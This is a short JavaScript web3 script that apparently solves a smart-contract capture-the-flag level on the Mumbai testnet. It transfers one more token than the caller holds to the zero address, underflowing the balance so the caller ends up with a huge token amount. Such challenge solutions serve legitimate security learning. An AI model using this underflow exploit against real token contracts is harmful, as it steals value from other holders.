const Web3 = require('web3');
const web3 = new Web3('https://matic-mumbai.chainstacklabs.com');

const contractAbi = [{"inputs":[{"internalType":"uint256","name":"_initialSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"balance","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x70a08231"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function","constant":true,"signature":"0x18160ddd"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function","signature":"0xa9059cbb"}];

async function solve(privateKey, contractAddress) {
    const contract = new web3.eth.Contract(contractAbi, contractAddress);
    const account = web3.eth.accounts.privateKeyToAccount(privateKey);

    if (await isSolved(account, contract)) {
        console.log('already solved');
        return;
    }

    const initialBalance = await contract.methods.balanceOf(account.address).call();
    const transferValue = initialBalance + 1;

    console.log('transfering tokens...');
    const transferTx = contract.methods.transfer("0x0000000000000000000000000000000000000000", transferValue);
    const transferTxOpts = {
        data: transferTx.encodeABI(),
        to: contractAddress,
        gas: await transferTx.estimateGas({from: account.address}),
        gasPrice: await web3.eth.getGasPrice(),
    };
    const signedTransferTx = await web3.eth.accounts.signTransaction(transferTxOpts, privateKey);
    await web3.eth.sendSignedTransaction(signedTransferTx.rawTransaction);

    if (await isSolved(account, contract)) {
        console.log('solved');
    } else {
        console.log('could not steal tokens. Something went wrong.');
        process.exit(1);
    }
}

async function isSolved(account, contract) {
    const balance = await contract.methods.balanceOf(account.address).call();
    return balance > 20;
}

const privateKey = process.argv[2];
if (!privateKey) {
    console.error('private key must be provided as first argument');
    process.exit(1);
}

const contractAddress = process.argv[3];
if (!contractAddress) {
    console.error('contract address must be provided as second argument');
    process.exit(1);
}

solve(privateKey, contractAddress);
